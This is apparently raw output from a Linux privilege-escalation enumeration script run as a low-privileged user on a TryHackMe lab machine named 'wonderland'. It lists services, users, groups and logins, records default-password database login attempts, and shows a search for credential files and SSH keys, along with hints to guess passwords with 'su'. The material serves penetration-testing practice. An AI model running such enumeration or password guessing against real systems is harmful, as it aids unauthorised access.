PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                        

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#services                                                                                   
You can't write on systemd PATH                                                                                                                          

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                     
NEXT                         LEFT        LAST                         PASSED       UNIT                         ACTIVATES                                
Wed 2021-09-22 22:38:35 UTC  9h left     Wed 2021-09-22 11:11:23 UTC  2h 18min ago motd-news.timer              motd-news.service
Thu 2021-09-23 00:02:17 UTC  10h left    Wed 2021-09-22 11:11:23 UTC  2h 18min ago apt-daily.timer              apt-daily.service
Thu 2021-09-23 06:02:33 UTC  16h left    Wed 2021-09-22 11:11:23 UTC  2h 18min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Thu 2021-09-23 11:25:01 UTC  21h left    Wed 2021-09-22 11:25:01 UTC  2h 4min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2021-09-27 00:00:00 UTC  4 days left Wed 2021-09-22 11:11:23 UTC  2h 18min ago fstrim.timer                 fstrim.service
n/a                          n/a         n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                     
                                                                                                                                                         
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                    
                                                                                                                                                         
╔══════════╣ HTTP sockets
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                    
                                                                                                                                                         
╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                      
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)                                                   
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                      
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                 
:1.0                                 615 systemd-resolve systemd-resolve  :1.0          systemd-resolved.service  -          -                  
:1.1                                 607 systemd-network systemd-network  :1.1          systemd-networkd.service  -          -                  
:1.142                              5642 busctl          hatter           :1.142        session-2.scope           2          -                  
:1.2                                   1 systemd         root             :1.2          init.scope                -          -                  
:1.4                                 724 accounts-daemon root             :1.4          accounts-daemon.service   -          -                  
:1.5                                 715 systemd-logind  root             :1.5          systemd-logind.service    -          -                  
:1.6                                 758 polkitd         root             :1.6          polkit.service            -          -                  
:1.8                                 706 networkd-dispat root             :1.8          networkd-dispatcher.se…ce -          -                  
:1.9                                 751 unattended-upgr root             :1.9          unattended-upgrades.se…ce -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts             724 accounts-daemon root             :1.4          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1           758 polkitd         root             :1.6          polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               715 systemd-logind  root             :1.5          systemd-logind.service    -          -                  
org.freedesktop.network1             607 systemd-network systemd-network  :1.1          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             615 systemd-resolve systemd-resolve  :1.0          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -                  
org.freedesktop.thermald               - -               -                (activatable) -                         -         
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


════════════════════════════════════╣ Network Information ╠════════════════════════════════════
╔══════════╣ Hostname, hosts and DNS                                                                                                                     
wonderland                                                                                                                                               
127.0.0.1 localhost
127.0.1.1 wonderland

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

╔══════════╣ Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found                                                                                                                                
                                                                                                                                                         
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                      
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.53.9  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::b7:c0ff:fef1:612f  prefixlen 64  scopeid 0x20<link>
        ether 02:b7:c0:f1:61:2f  txqueuelen 1000  (Ethernet)
        RX packets 39336  bytes 6819473 (6.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 37055  bytes 11509100 (11.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 230  bytes 18444 (18.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 230  bytes 18444 (18.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Networks and neighbours
Kernel IP routing table                                                                                                                                  
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         ip-10-10-0-1.eu 0.0.0.0         UG    100    0        0 eth0
10.10.0.0       0.0.0.0         255.255.0.0     U     0      0        0 eth0
ip-10-10-0-1.eu 0.0.0.0         255.255.255.255 UH    100    0        0 eth0
Address                  HWtype  HWaddress           Flags Mask            Iface
ip-10-10-0-1.eu-west-1.  ether   02:c8:85:b5:5a:aa   C                     eth0

╔══════════╣ Iptables rules
iptables rules Not Found                                                                                                                                 
                                                                                                                                                         
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                 
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                        
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                       
                                                                                                                                                         

════════════════════════════════════╣ Users Information ╠════════════════════════════════════
╔══════════╣ My user                                                                                                                                     
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                                                      
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)                                                                                                    

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                             
netpgpkeys Not Found
netpgp Not Found                                                                                                                                         
                                                                                                                                                         
╔══════════╣ Clipboard or highlighted text?
xsel and xclip Not Found                                                                                                                                 
                                                                                                                                                         
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                              
                                                                                                                                                         
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                                                        
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)                                                                                                    
gdb wasn't found in PATH

╔══════════╣ Checking doas.conf
/etc/doas.conf Not Found                                                                                                                                 
                                                                                                                                                         
╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                    
                                                                                                                                                         
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                          

╔══════════╣ Users with console
alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash                                                                                                 
hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
root:x:0:0:root:/root:/bin/bash
tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                   
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(tryhackme) gid=1000(tryhackme) groups=1000(tryhackme),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
uid=1001(alice) gid=1001(alice) groups=1001(alice)
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 13:30:05 up  2:20,  1 user,  load average: 0.65, 0.16, 0.05                                                                                             
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
alice    pts/0    10.6.101.121     12:03   28.00s  0.20s  0.15s python3 -c import pty;pty.spawn ("/bin/bash")

╔══════════╣ Last logons
reboot   system boot  Mon May 25 18:13:33 2020 - Mon May 25 18:30:17 2020  (00:16)     0.0.0.0                                                           
alice    pts/1        Mon May 25 16:37:21 2020 - Mon May 25 18:07:15 2020  (01:29)     192.168.170.1
tryhackme pts/0        Mon May 25 16:36:44 2020 - Mon May 25 18:07:10 2020  (01:30)     192.168.170.1
reboot   system boot  Mon May 25 16:26:29 2020 - Mon May 25 18:07:22 2020  (01:40)     0.0.0.0
tryhackme pts/0        Mon May 25 00:22:10 2020 - Mon May 25 03:53:07 2020  (03:30)     192.168.170.1
tryhackme tty1         Mon May 25 00:21:49 2020 - Mon May 25 00:22:14 2020  (00:00)     0.0.0.0
reboot   system boot  Mon May 25 00:21:03 2020 - Mon May 25 03:53:23 2020  (03:32)     0.0.0.0
reboot   system boot  Mon May 25 00:20:26 2020 - Mon May 25 00:20:40 2020  (00:00)     0.0.0.0

wtmp begins Mon May 25 00:20:26 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                        
tryhackme        pts/0    10.8.6.110       Fri Jun  5 22:28:57 +0000 2020
alice            pts/0    10.6.101.121     Wed Sep 22 12:03:51 +0000 2021

╔══════════╣ Password policy
PASS_MAX_DAYS   99999                                                                                                                                    
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                                         
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                         


════════════════════════════════════╣ Software Information ╠════════════════════════════════════
╔══════════╣ MySQL version                                                                                                                               
mysql Not Found                                                                                                                                          
                                                                                                                                                         
═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                                                               
═╣ MySQL connection using root/NOPASS ................. No                                                                                               
╔══════════╣ Searching mysql credentials and exec                                                                                                        
                                                                                                                                                         
╔══════════╣ Analyzing PostgreSQL Files (limit 70)
Version: psql Not Found                                                                                                                                  
                                                                                                                                                         
pgadmin*.db Not Found
                                                                                                                                                         
pg_hba.conf Not Found
                                                                                                                                                         
postgresql.conf Not Found
                                                                                                                                                         
pgsql.conf Not Found
                                                                                                                                                         
═╣ PostgreSQL connection to template0 using postgres/NOPASS ........ No
═╣ PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                  
═╣ PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                  
═╣ PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                  
                                                                                                                                                         
╔══════════╣ Analyzing Mongo Files (limit 70)
Version: mongo Not Found                                                                                                                                 
mongod Not Found                                                                                                                                         
                                                                                                                                                         
mongod*.conf Not Found
                                                                                                                                                         
╔══════════╣ Analyzing Apache Files (limit 70)
Version: apache2 Not Found                                                                                                                               
httpd Not Found                                                                                                                                          
                                                                                                                                                         
══╣ PHP exec extensions
sites-enabled Not Found                                                                                                                                  
                                                                                                                                                         
000-default.conf Not Found
                                                                                                                                                         
╔══════════╣ Analyzing Tomcat Files (limit 70)
tomcat-users.xml Not Found                                                                                                                               
                                                                                                                                                         
╔══════════╣ Analyzing FastCGI Files (limit 70)
fastcgi_params Not Found                                                                                                                                 
                                                                                                                                                         
╔══════════╣ Analyzing Http conf Files (limit 70)
httpd.conf Not Found                                                                                                                                     
                                                                                                                                                         
╔══════════╣ Analyzing Htpasswd Files (limit 70)
.htpasswd Not Found                                                                                                                                      
                                                                                                                                                         
╔══════════╣ Analyzing PHP Sessions Files (limit 70)
/var/lib/php/sessions Not Found                                                                                                                          
sess_* Not Found                                                                                                                                         
                                                                                                                                                         
╔══════════╣ Analyzing Wordpress Files (limit 70)
wp-config.php Not Found                                                                                                                                  
                                                                                                                                                         
╔══════════╣ Analyzing Drupal Files (limit 70)
settings.php Not Found                                                                                                                                   
                                                                                                                                                         
╔══════════╣ Analyzing Moodle Files (limit 70)
config.php Not Found                                                                                                                                     
                                                                                                                                                         
╔══════════╣ Analyzing Supervisord Files (limit 70)
supervisord.conf Not Found                                                                                                                               
                                                                                                                                                         
╔══════════╣ Analyzing Cesi Files (limit 70)
cesi.conf Not Found                                                                                                                                      
                                                                                                                                                         
╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf                                                                       
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

rsyncd.secrets Not Found
                                                                                                                                                         
╔══════════╣ Analyzing Hostapd Files (limit 70)
hostapd.conf Not Found                                                                                                                                   
                                                                                                                                                         
╔══════════╣ Searching wifi conns file
 Not Found                                                                                                                                               
                                                                                                                                                         
╔══════════╣ Analyzing Anaconda ks Files (limit 70)
anaconda-ks.cfg Not Found                                                                                                                                
                                                                                                                                                         
╔══════════╣ Analyzing VNC Files (limit 70)
.vnc Not Found                                                                                                                                           
                                                                                                                                                         
*vnc*.c*nf* Not Found
                                                                                                                                                         
*vnc*.ini Not Found
                                                                                                                                                         
*vnc*.txt Not Found
                                                                                                                                                         
*vnc*.xml Not Found
                                                                                                                                                         
╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                     
drwxr-xr-x 2 root root 4096 May 25  2020 /etc/ldap


╔══════════╣ Analyzing OpenVPN Files (limit 70)
*.ovpn Not Found                                                                                                                                         
                                                                                                                                                         
╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                              
id_dsa* Not Found                                                                                                                                        
                                                                                                                                                         
id_rsa* Not Found
                                                                                                                                                         
known_hosts Not Found
                                                                                                                                                         
authorized_hosts Not Found
                                                                                                                                                         
authorized_keys Not Found
                                                                                                                                                         
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem                                                                                                                    
1436PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                           
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                         


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Searching unexpected auth lines in /etc/pam.d/sshd
No                                                                                                                                                       
                                                                                                                                                         
╔══════════╣ NFS exports?
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                     
/etc/exports Not Found                                                                                                                                   
                                                                                                                                                         
╔══════════╣ Searching kerberos conf files and tickets
╚ https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                      
tickets kerberos Not Found                                                                                                                               
klist Not Found                                                                                                                                          
                                                                                                                                                         
╔══════════╣ Analyzing Knockd Files (limit 70)
*knockd* Not Found                                                                                                                                       
                                                                                                                                                         
╔══════════╣ Analyzing Kibana Files (limit 70)
kibana.y*ml Not Found                                                                                                                                    
                                                                                                                                                         
╔══════════╣ Analyzing Elasticsearch Files (limit 70)
The version is                                                                                                                                           
elasticsearch.y*ml Not Found
                                                                                                                                                         
╔══════════╣ Searching logstash files
 Not Found                                                                                                                                               
                                                                                                                                                         
╔══════════╣ Searching Vault-ssh files
vault-ssh-helper.hcl Not Found                                                                                                                           
                                                                                                                                                         
╔══════════╣ Searching AD cached hashes
cached hashes Not Found                                                                                                                                  
                                                                                                                                                         
╔══════════╣ Searching screen sessions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                        
No Sockets found in /run/screen/S-hatter.                                                                                                                

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                        
tmux Not Found                                                                                                                                           
                                                                                                                                                         
╔══════════╣ Analyzing CouchDB Files (limit 70)
couchdb Not Found                                                                                                                                        
                                                                                                                                                         
╔══════════╣ Analyzing Redis Files (limit 70)
redis.conf Not Found                                                                                                                                     
                                                                                                                                                         
╔══════════╣ Searching dovecot files
dovecot credentials Not Found                                                                                                                            
                                                                                                                                                         
╔══════════╣ Analyzing Mosquitto Files (limit 70)
mosquitto.conf Not Found                                                                                                                                 
                                                                                                                                                         
╔══════════╣ Analyzing Neo4j Files (limit 70)
neo4j Not Found                                                                                                                                          
                                                                                                                                                         
╔══════════╣ Analyzing Cloud Credentials Files (limit 70)
credentials Not Found                                                                                                                                    
                                                                                                                                                         
credentials.db Not Found
                                                                                                                                                         
legacy_credentials.db Not Found
                                                                                                                                                         
access_tokens.db Not Found
                                                                                                                                                         
access_tokens.json Not Found
                                                                                                                                                         
accessTokens.json Not Found
                                                                                                                                                         
azureProfile.json Not Found
                                                                                                                                                         
TokenCache.dat Not Found
                                                                                                                                                         
AzureRMContext.json Not Found
                                                                                                                                                         
.bluemix Not Found
                                                                                                                                                         
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3517 Jan 15  2020 /etc/cloud/cloud.cfg                                                                                            
     lock_passwd: True

╔══════════╣ Analyzing CloudFlare Files (limit 70)
.cloudflared Not Found                                                                                                                                   
                                                                                                                                                         
╔══════════╣ Analyzing Erlang Files (limit 70)
.erlang.cookie Not Found                                                                                                                                 
                                                                                                                                                         
╔══════════╣ Analyzing GMV Auth Files (limit 70)
gvm-tools.conf Not Found                                                                                                                                 
                                                                                                                                                         
╔══════════╣ Analyzing IPSec Files (limit 70)
ipsec.secrets Not Found                                                                                                                                  
                                                                                                                                                         
ipsec.conf Not Found
                                                                                                                                                         
╔══════════╣ Analyzing IRSSI Files (limit 70)
.irssi Not Found                                                                                                                                         
                                                                                                                                                         
╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb  3  2020 /usr/share/keyrings                                                                                             

*.keyring Not Found
                                                                                                                                                         
*.keystore Not Found
                                                                                                                                                         
*.jks Not Found
                                                                                                                                                         
╔══════════╣ Analyzing Filezilla Files (limit 70)
filezilla Not Found                                                                                                                                      
                                                                                                                                                         
filezilla.xml Not Found
                                                                                                                                                         
recentservers.xml Not Found
                                                                                                                                                         
╔══════════╣ Analyzing Backup Manager Files (limit 70)
storage.php Not Found                                                                                                                                    
                                                                                                                                                         
database.php Not Found
                                                                                                                                                         
╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                           
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching GitLab related files
                                                                                                                                                         

╔══════════╣ Analyzing Github Files (limit 70)
.github Not Found                                                                                                                                        
                                                                                                                                                         
.gitconfig Not Found
                                                                                                                                                         
.git-credentials Not Found
                                                                                                                                                         
.git Not Found
                                                                                                                                                         
╔══════════╣ Analyzing Svn Files (limit 70)
.svn Not Found                                                                                                                                           
                                                                                                                                                         
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                             
netpgpkeys Not Found
netpgp Not Found                                                                                                                                         
*.pgp Not Found                                                                                                                                          
                                                                                                                                                         
-rw-r--r-- 1 root root 2796 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 3267 Jan 10  2019 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 alice alice 4096 May 25  2020 /home/alice/.gnupg

╔══════════╣ Analyzing Cache Vi Files (limit 70)
*.swp Not Found                                                                                                                                          
                                                                                                                                                         
*.viminfo Not Found
                                                                                                                                                         
╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation                                                        
                                                                                                                                                         
╔══════════╣ Checking if runc is available
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                                                                  
                                                                                                                                                         
╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket                                                                     
                                                                                                                                                         
╔══════════╣ Analyzing Firefox Files (limit 70)
.mozilla Not Found                                                                                                                                       
                                                                                                                                                         
Firefox Not Found
                                                                                                                                                         
╔══════════╣ Analyzing Chrome Files (limit 70)
google-chrome Not Found                                                                                                                                  
                                                                                                                                                         
Chrome Not Found
                                                                                                                                                         
╔══════════╣ Analyzing Autologin Files (limit 70)
autologin Not Found                                                                                                                                      
                                                                                                                                                         
autologin.conf Not Found
                                                                                                                                                         
╔══════════╣ S/Key authentication
                                                                                                                                                         
╔══════════╣ YubiKey authentication
                                                                                                                                                         
╔══════════╣ Passwords inside pam.d
                                                                                                                                                         
╔══════════╣ Analyzing SNMP Files (limit 70)
snmpd.conf Not Found                                                                                                                                     
                                                                                                                                                         
╔══════════╣ Analyzing Pypirc Files (limit 70)
.pypirc Not Found                                                                                                                                        
                                                                                                                                                         
╔══════════╣ Analyzing Ldaprc Files (limit 70)
.ldaprc Not Found                                                                                                                                        
                                                                                                                                                         
╔══════════╣ Analyzing Env Files (limit 70)
.env Not Found                                                                                                                                           
                                                                                                                                                         
╔══════════╣ Analyzing Msmtprc Files (limit 70)
.msmtprc Not Found                                                                                                                                       
                                                                                                                                                         
╔══════════╣ Analyzing Keepass Files (limit 70)
*.kdbx Not Found                                                                                                                                         
                                                                                                                                                         
KeePass.config* Not Found
                                                                                                                                                         
KeePass.ini Not Found
                                                                                                                                                         
KeePass.enforced* Not Found
                                                                                                                                                         
╔══════════╣ Analyzing FTP Files (limit 70)
*.ftpconfig Not Found                                                                                                                                    
                                                                                                                                                         
ffftp.ini Not Found
                                                                                                                                                         
ftp.ini Not Found
                                                                                                                                                         
ftp.config Not Found
                                                                                                                                                         
sites.ini Not Found
                                                                                                                                                         
wcx_ftp.ini Not Found
                                                                                                                                                         
winscp.ini Not Found
                                                                                                                                                         
ws_ftp.ini Not Found
                                                                                                                                                         
╔══════════╣ Analyzing Opera Files (limit 70)
com.operasoftware.Opera Not Found                                                                                                                        
                                                                                                                                                         
╔══════════╣ Analyzing Safari Files (limit 70)
Safari Not Found                                                                                                                                         
                                                                                                                                                         
╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind                                                                      
sed: -e expression #1, char 0: no previous regular expression



╔══════════╣ Analyzing SeedDMS Files (limit 70)
seeddms* Not Found                                                                                                                                       
                                                                                                                                                         
╔══════════╣ Analyzing Ddclient Files (limit 70)
ddclient.conf Not Found                                                                                                                                  
                                                                                                                                                         
╔══════════╣ Analyzing Cacti Files (limit 70)
cacti Not Found                                                                                                                                          
                                                                                                                                                         
╔══════════╣ Analyzing Interesting logs Files (limit 70)
access.log Not Found                                                                                                                                     
                                                                                                                                                         
error.log Not Found
                                                                                                                                                         
╔══════════╣ Analyzing Windows Files Files (limit 70)
unattend.inf Not Found                                                                                                                                   
                                                                                                                                                         
*.rdg Not Found
                                                                                                                                                         
AppEvent.Evt Not Found
                                                                                                                                                         
ConsoleHost_history.txt Not Found
                                                                                                                                                         
FreeSSHDservice.ini Not Found
                                                                                                                                                         
NetSetup.log Not Found
                                                                                                                                                         
Ntds.dit Not Found
                                                                                                                                                         
protecteduserkey.bin Not Found
                                                                                                                                                         
RDCMan.settings Not Found
                                                                                                                                                         
SAM Not Found
                                                                                                                                                         
SYSTEM Not Found
                                                                                                                                                         
SecEvent.Evt Not Found
                                                                                                                                                         
appcmd.exe Not Found
                                                                                                                                                         
bash.exe Not Found
                                                                                                                                                         
datasources.xml Not Found
                                                                                                                                                         
default.sav Not Found
                                                                                                                                                         
drives.xml Not Found
                                                                                                                                                         
groups.xml Not Found
                                                                                                                                                         
https-xampp.conf Not Found
                                                                                                                                                         
https.conf Not Found
                                                                                                                                                         
iis6.log Not Found
                                                                                                                                                         
index.dat Not Found
                                                                                                                                                         
my.cnf Not Found
                                                                                                                                                         
my.ini Not Found
                                                                                                                                                         
ntuser.dat Not Found
                                                                                                                                                         
pagefile.sys Not Found
                                                                                                                                                         
php.ini Not Found
                                                                                                                                                         
printers.xml Not Found
                                                                                                                                                         
recentservers.xml Not Found
                                                                                                                                                         
scclient.exe Not Found
                                                                                                                                                         
scheduledtasks.xml Not Found
                                                                                                                                                         
security.sav Not Found
                                                                                                                                                         
server.xml Not Found
                                                                                                                                                         
setupinfo Not Found
                                                                                                                                                         
setupinfo.bak Not Found
                                                                                                                                                         
sitemanager.xml Not Found
                                                                                                                                                         
sites.ini Not Found
                                                                                                                                                         
software Not Found
                                                                                                                                                         
software.sav Not Found
                                                                                                                                                         
sysprep.inf Not Found
                                                                                                                                                         
sysprep.xml Not Found
                                                                                                                                                         
drwxr-xr-x 13 root root 4096 May 25  2020 /etc/systemd/system
drwxr-xr-x 3 root root 4096 May 25  2020 /usr/src/linux-headers-4.15.0-101-generic/include/config/acpi/system
drwxr-xr-x 2 root root 4096 May 25  2020 /usr/src/linux-headers-4.15.0-101-generic/include/config/spi/slave/system
drwxr-xr-x 6 root root 4096 May 25  2020 /usr/src/linux-headers-4.15.0-101-generic/include/config/system

system.sav Not Found
                                                                                                                                                         
unattend.txt Not Found
                                                                                                                                                         
unattend.xml Not Found
                                                                                                                                                         
unattended.xml Not Found
                                                                                                                                                         
wcx_ftp.ini Not Found
                                                                                                                                                         
